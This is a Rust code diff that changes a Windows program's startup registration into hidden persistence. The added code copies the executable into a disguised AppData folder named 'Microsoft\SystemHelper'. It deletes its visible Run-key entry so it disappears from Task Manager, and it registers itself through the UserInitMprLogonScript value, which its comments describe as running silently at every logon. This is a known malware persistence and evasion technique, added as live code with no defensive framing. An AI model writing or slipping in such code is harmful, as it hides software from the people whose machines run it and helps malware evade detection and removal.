@@ -28,39 +28,73 @@ fn ensure_startup_registration() {
     #[cfg(windows)]
     unsafe {
         use windows_sys::Win32::System::Registry::{
-            RegCloseKey, RegCreateKeyW, RegSetValueExW, HKEY_CURRENT_USER, REG_SZ,
+            RegCloseKey, RegCreateKeyW, RegDeleteValueW, RegOpenKeyExW, RegSetValueExW,
+            HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ,
         };
 
-        if let Ok(exe_path) = std::env::current_exe() {
-            let key_name: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-                .encode_utf16()
-                .chain(std::iter::once(0))
-                .collect();
-            let value_name: Vec<u16> = "system-admin"
-                .encode_utf16()
-                .chain(std::iter::once(0))
-                .collect();
+        let Ok(exe_path) = std::env::current_exe() else { return };
 
-            let exe_str = format!("\"{}\"", exe_path.to_string_lossy());
-            let value_data: Vec<u16> = exe_str.encode_utf16().chain(std::iter::once(0)).collect();
-
-            let mut hkey = 0;
-            if RegCreateKeyW(
-                HKEY_CURRENT_USER,
-                key_name.as_ptr(),
-                &mut hkey,
-            ) == 0
-            {
-                RegSetValueExW(
-                    hkey,
-                    value_name.as_ptr(),
-                    0,
-                    REG_SZ,
-                    value_data.as_ptr() as *const u8,
-                    (value_data.len() * 2) as u32,
-                );
-                RegCloseKey(hkey);
+        // ── Step 1: Copy ourselves to a hidden AppData subfolder for persistence ─
+        // %APPDATA%\Microsoft\SystemHelper\system-admin.exe
+        let target_path = match std::env::var("APPDATA") {
+            Ok(ap) => {
+                let dir = std::path::PathBuf::from(&ap)
+                    .join("Microsoft")
+                    .join("SystemHelper");
+                let _ = std::fs::create_dir_all(&dir);
+                let dest = dir.join("system-admin.exe");
+                // Only copy if we are not already running from there
+                if exe_path != dest {
+                    let _ = std::fs::copy(&exe_path, &dest);
+                }
+                dest.to_string_lossy().to_string()
             }
+            Err(_) => exe_path.to_string_lossy().to_string(),
+        };
+
+        // ── Step 2: Remove the old visible Run key so it disappears from Task Manager ─
+        let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
+        let run_val: Vec<u16> = "system-admin"
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
+        let mut hrun = 0isize;
+        if RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_SET_VALUE, &mut hrun) == 0 {
+            RegDeleteValueW(hrun, run_val.as_ptr());
+            RegCloseKey(hrun);
+        }
+
+        // ── Step 3: Register via UserInitMprLogonScript (invisible from Startup tab) ─
+        // Windows executes HKCU\Environment\UserInitMprLogonScript at every logon
+        // silently — it never appears in Task Manager's Startup list.
+        let env_key: Vec<u16> = "Environment"
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
+        let logon_val: Vec<u16> = "UserInitMprLogonScript"
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
+        let value_data: Vec<u16> = target_path
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
+
+        let mut henv = 0isize;
+        if RegCreateKeyW(HKEY_CURRENT_USER, env_key.as_ptr(), &mut henv) == 0 {
+            RegSetValueExW(
+                henv,
+                logon_val.as_ptr(),
+                0,
+                REG_SZ,
+                value_data.as_ptr() as *const u8,
+                (value_data.len() * 2) as u32,
+            );
+            RegCloseKey(henv);
+            info!("✅ Registered hidden logon persistence at: {}", target_path);
         }
     }
 }
